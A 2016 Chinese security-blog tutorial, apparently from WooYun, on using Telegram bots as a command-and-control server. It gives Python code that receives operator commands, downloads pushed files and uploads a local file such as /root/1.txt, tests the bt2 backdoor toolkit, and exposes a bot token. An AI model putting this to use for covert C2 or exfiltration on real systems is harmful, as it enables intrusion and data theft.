@@ -1,0 +1,118 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Use Bots of Telegram as a C2 server</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/05/27 9:37" ui-time="" datetime="2016/05/27 9:37" class="published ng-binding ng-isolate-scope">2016/05/27 9:37</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>在Github上，涉及到将社交网络作为C2 server（可理解为命令控制服务器）的poc项目越来越多，如利用gmail的<code>gcat</code>、<code>gdog</code>，利用twitter的<code>twittor</code>、以及利用Telegram的<code>Blaze Telegram Backdoor Toolkit (bt2)</code>，使用这类方法的好处不仅仅是因为社交网络的服务器稳定，更多的原因在于其通信可以隐藏在正常流量中，不易被发现。本文将对Telegram中的Bots功能作详细介绍，并通过python实现基础的的api调用，同时对Blaze Telegram Backdoor Toolkit (bt2)进行测试，分享其中需要注意的地方。</p><p><strong>github项目链接：</strong></p><ul><li>gcat： <a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a></li><li>gdog： <a href="https://github.com/maldevel/gdog">https://github.com/maldevel/gdog</a></li><li>twittor： <a href="https://github.com/PaulSec/twittor">https://github.com/PaulSec/twittor</a></li><li>bt2： <a href="https://github.com/blazeinfosec/bt2">https://github.com/blazeinfosec/bt2</a></li></ul><h1>0x01 简介</h1><hr><h3>Telegram：</h3><ul><li>跨平台的实时通讯应用</li><li>支持Android、iPhone/iPad、WP、Web、PC/Mac/Linux</li><li>通信加密，官方悬赏$300,000 for Cracking Telegram Encryption</li><li>支持发送所有文件类型</li><li>开放api，可定制开发客户端</li></ul><h3>Bots：</h3><p>Tegegram内置的第三方应用，通信方式为HTTPS</p><h3>功能(类似于聊天机器人)：</h3><ul><li>Get customized notifications and news</li><li>Integrate with other services</li><li>Create custom tools</li><li>Build single- and multiplayer games</li><li>Build social services</li><li>Do virtually anything else</li></ul><h1>0x02 搭建c2 server</h1><hr><p>登录Tegegram</p><p>访问<a href="https://telegram.me/botfather">https://telegram.me/botfather</a></p><p>添加BotFather为联系人(BotFather用来创建和管理自定义bot)</p><p>如图</p><p><img alt="Alt text" img-src="f8b8bfcd9a8ab831cb8682c71c5293cde58f45f8.jpg"></p><p>按照提示创建自定义bot</p><p>输入<code>/newbot</code>，设定如下参数：</p><pre><code>#!bash
+name：Tegegram联系列表中显示的名称，可任意设定
+Username：可理解为botID，此处唯一，需要区别于其他用户创建的ID，结尾必须为"bot"
+token：与bot通信需要提供的凭据
+</code></pre><p>成功创建后自动生成token：<code>221409431:AAEeLznGbuzRONKCwHqyywmetjghCkXl_8</code></p><p>如图</p><p><img alt="Alt text" img-src="2160610c3b404309f3fcec38435928aa737927fa.jpg"></p><p><strong>其他命令：</strong></p><pre><code>#!bash
+/token：显示已生成的token
+/revoke可用来重新生成token
+</code></pre><p>至此，一个简单的c2 Server搭建完毕</p><h1>0x03 Bot API实例介绍</h1><hr><p>目前Telegram官网已经公开了如下语言的开发实例:</p><ul><li>PHP</li><li>Python</li><li>Java</li><li>C#</li><li>Ruby</li><li>Go</li><li>Lua</li><li>Node.js</li><li>Haskell</li></ul><p>可在如下页面具体查看: <a href="https://core.telegram.org/bots/samples">https://core.telegram.org/bots/samples</a></p><p>本文选用python作测试:</p><p><strong>环境搭建</strong></p><pre><code>测试系统： 
+kali 1.0
+python 2.7.3
+测试帐户: 3333g
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="f5764cc3ecf11862b7e563afdc034794804e34aa.jpg"></p><h3>1、安装更新</h3><pre><code>#!bash
+pip install telepot
+pip install requests
+</code></pre><h3>2、测试帐户是否可用</h3><pre><code>#!python
+import telepot
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+bot.getMe()
+</code></pre><p><strong>注：</strong><br><code>221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8</code>为创建bot后自动生成的token</p><p>如图，返回username相关信息</p><p><img alt="Alt text" img-src="6f2ff0095210ab7e8edcc7322c481800626fd1ef.jpg"></p><h3>3、接收消息</h3><p>在Telegram控制端向c2_test发送消息:hello test</p><p>如图</p><p><img alt="Alt text" img-src="decb47124d18cdeafe3653b5b1687b12d68ab3ff.jpg"></p><p>python下执行如下代码接收消息：</p><pre><code>#!python
+import telepot
+from pprint import pprint
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+response = bot.getUpdates()
+pprint(response)
+</code></pre><p>如图，成功接收Server端发来的消息</p><p><img alt="Alt text" img-src="047341ac90384ff1b2fde29e00c270773cbca203.jpg"></p><p>可获取测试帐户的first name为3333，last_name为g，id(已打码)，接收到的消息内容为hello test</p><h3>4、循环接收消息：</h3><p>需要使用<code>bot.message_loop</code></p><p>完整测试代码如下：</p><pre><code>#!python
+#!/usr/bin/python
+import sys
+import time
+import pprint
+import telepot
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+print ('Listening ...')
+def handle(msg):
+    pprint.pprint(msg)
+def main(): 
+    try:
+        bot.message_loop(handle)
+    except Exception as err:
+        print err
+    while True:
+        time.sleep(10)
+if __name__ == '__main__':
+    main()
+</code></pre><p>运行如图，成功接收Server端发送的5条文字消息</p><p><img alt="Alt text" img-src="0387e4d6945be610cda8806a4c632e5157268d1a.jpg"></p><h3>5、提取文字消息</h3><p>使用<code>glance()</code>可以从接收的消息中提取一个元组（<strong>content&#95;type，chat&#95;type，chat_id</strong>）</p><blockquote><p>content&#95;type 包括 text, audio, document, photo, sticker, video, voice,contact, location, venue, new&#95;chat&#95;member, left&#95;chat_member, etc.<br>chat_type 包括 private, group, or channel.</p></blockquote><p>所以我们可以使用<code>glance()</code>把接收的文字消息提取出来，代码如下：</p><pre><code>#!python
+#!/usr/bin/python
+import sys
+import time
+import pprint
+import telepot
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+print ('Listening ...')
+def handle(msg):
+    content_type, chat_type, chat_id = telepot.glance(msg)    
+
+    if content_type == 'text':
+        received_command = msg['text']
+        print (received_command)        
+    else:
+        print (content_type, chat_type, chat_id)
+        return
+def main():  
+    try:
+        bot.message_loop(handle)
+    except Exception as err:
+        print err
+    while True:
+        time.sleep(10)
+
+if __name__ == '__main__':
+    main()
+</code></pre><p>测试如图，提取出Server端发来的文本消息</p><p><img alt="Alt text" img-src="1fe6c680ed6f727812f0e2d9a762ffddb84ccc5b.jpg"></p><h3>6、接收文件</h3><p>执行接收消息的python代码，可获得接收文件的消息格式，如图</p><p><img alt="Alt text" img-src="c5363d3f7957ecc0069bb9537821f06402edc51a.jpg"></p><p>下载文件需要使用<code>bot.download_file(file_id, filename)</code></p><p><img alt="Alt text" img-src="2aa57cc7cf1c9ef32a53207389b01e9a49022e2e.jpg"></p><p>优化过的完整代码如下，可接收上图Server端发送的文件，并保存在当前目录</p><pre><code>#!python
+#!/usr/bin/python
+import sys
+import time
+import pprint
+import telepot
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+print ('Listening ...')
+def handle(msg):
+    content_type, chat_type, chat_id = telepot.glance(msg)    
+
+    if content_type == 'text':
+        received_command = msg['text']
+        print (received_command)    
+    elif content_type == 'document':
+        file_id = msg['document']['file_id']
+        filename = msg['document']['file_name']
+        bot.download_file(file_id, filename)
+        print "[+] Download File Success!"
+    else:
+        print (content_type, chat_type, chat_id)
+        return
+def main():  
+    try:
+        bot.message_loop(handle)
+    except Exception as err:
+        print err
+    while True:
+        time.sleep(10)
+
+if __name__ == '__main__':
+    main()
+</code></pre><h3>7、发送消息</h3><p>使用<code>bot.sendMessage(chat_id, message)</code></p><p>向Server端发送一条消息，代码如下：</p><pre><code>#!python
+import telepot
+from pprint import pprint
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+bot.sendMessage(chat_id, 'Hello C2 Server')  
+</code></pre><p><strong>注：</strong><br>chat&#95;id换成自己帐号的chat&#95;id</p><p>如图</p><p><img alt="Alt text" img-src="0966240c8a880af35ff93ca21115b7a78e466593.jpg"></p><p>Server端接收消息，显示如下：</p><p><img alt="Alt text" img-src="647792da369116c6e162d5d0bf042c3eaec7a6b8.jpg"></p><h3>8、发送文件</h3><p>使用<code>bot.sendDocument(chat_id,file)</code></p><p>代码如下：</p><pre><code>#!python
+import telepot
+from pprint import pprint
+bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
+f = open('/root/1.txt', 'rb')  
+bot.sendDocument(chat_id, f)
+</code></pre><p><strong>注：</strong><br>chat&#95;id换成自己帐号的chat&#95;id</p><p>如图，Server端可接收bot发过来的文件</p><p><img alt="Alt text" img-src="a89d8c6857f82b4c654a516fa9388f8d85654876.jpg"></p><p>以上介绍了Bot API中发送、接收文本消息和上传、下载文件的功能，剩下只需要将功能拼接，添加命令解析，就可以实现一个简易的C2 Server POC</p><h1>0x04 bt2测试</h1><hr><h3>1、搭建C2 Server</h3><p>同0x02</p><h3>2、配置环境</h3><pre><code>#!bash
+pip install telepot
+pip install requests
+git clone https://github.com/blazeinfosec/bt2.git
+</code></pre><h3>3、编辑bt2.py</h3><p>设置以下参数</p><ul><li>API_TOKEN：token</li><li>BOTMASTER&#95;ID:自己帐号的chat&#95;id</li></ul><h3>4、运行bt2.py</h3><p>Clinet上线，发送操作帮助</p><p>如图</p><p><img alt="Alt text" img-src="90eb3b6b5f45035a03b0e34fc0e26aab0bd9d554.jpg"></p><h3>5、测试命令</h3><p>如图</p><p><img alt="Alt text" img-src="0f0c1626f53e9dd93195bad7ec623b68535daa86.jpg"></p><p>测试成功</p><h3>6、windows平台下支持执行shellcode</h3><p>演示略</p><h3>7、补充</h3><p>bt2已经搭建好了poc的完整框架，通过Telegram的Bots完全可以实现C2 Server所需的全部功能。bt2目前还存在一些bug，感兴趣的小伙伴可以去他们的github提交代码</p><h1>0x05 小结</h1><hr><p>Bot还支持一些高级用法，可参照文末的链接，实现一些更加高级的功能。</p><p>国内用户目前无法使用gmail、twitter和telegram，所以gcat、gdog、twittor、bt2均无法对国内用户直接造成威胁。技术不分好坏，坏的是人，希望本文对你有所帮助。</p><p><strong>更多研究资料：</strong></p><ul><li><a href="https://blog.blazeinfosec.com/bt2-leveraging-telegram-as-a-command-control-platform/">https://blog.blazeinfosec.com/bt2-leveraging-telegram-as-a-command-control-platform/</a></li><li><a href="https://github.com/nickoala/telepot">https://github.com/nickoala/telepot</a></li><li><a href="https://core.telegram.org/bots/api">https://core.telegram.org/bots/api</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2016-05-27 14:21:40</span></div><p></p><p>这个其实有很多玩法的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2016-05-27 14:19:11</span></div><p></p><p>卧槽，我最近写的就是和这个有关</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zz</span> <span class="reply-time">2016-05-27 10:55:40</span></div><p></p><p>翻译+实践+哄鬼？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kk</span> <span class="reply-time">2016-05-27 10:49:05</span></div><p></p><p>翻译+实践？</p><p></p></div></div></div></div></div></main>
